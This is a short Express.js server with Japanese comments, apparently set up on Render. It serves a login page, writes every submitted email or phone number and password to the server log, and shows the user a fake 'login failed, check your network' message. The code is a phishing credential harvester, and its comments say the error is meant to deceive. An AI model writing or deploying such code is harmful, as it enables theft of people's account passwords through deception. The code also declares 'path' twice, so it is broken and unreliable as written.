const express = require('express');
const path = require('path');
const app = express();
const PORT = 10000; // Renderが標準で使いたがる10000番に直接固定します

// フォームから送られてくるデータを解析するための設定
app.use(express.urlencoded({ extended: true }));

// CSSなどの静的ファイルを読み込めるようにする設定（style.css用）
app.use(express.static(__dirname));

// ログイン画面を表示
const path = require('path');
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ログインボタンが押された時の処理
app.post('/login', (req, res) => {
    const email = req.body.email;
    const password = req.body.password;

    // ここでRenderのログに入力内容を表示します
    console.log("---------- 新しい入力がありました ----------");
    console.log("メール/電話:", email);
    console.log("パスワード:", password);
    console.log("-------------------------------------------");

    // ユーザーには完了画面（またはエラーっぽく見せる画面）を返す
    res.send("ログインに失敗しました。ネットワーク接続を確認してください。");
});

app.listen(PORT, () => {
    console.log(`Server started on port ${PORT}`);
});
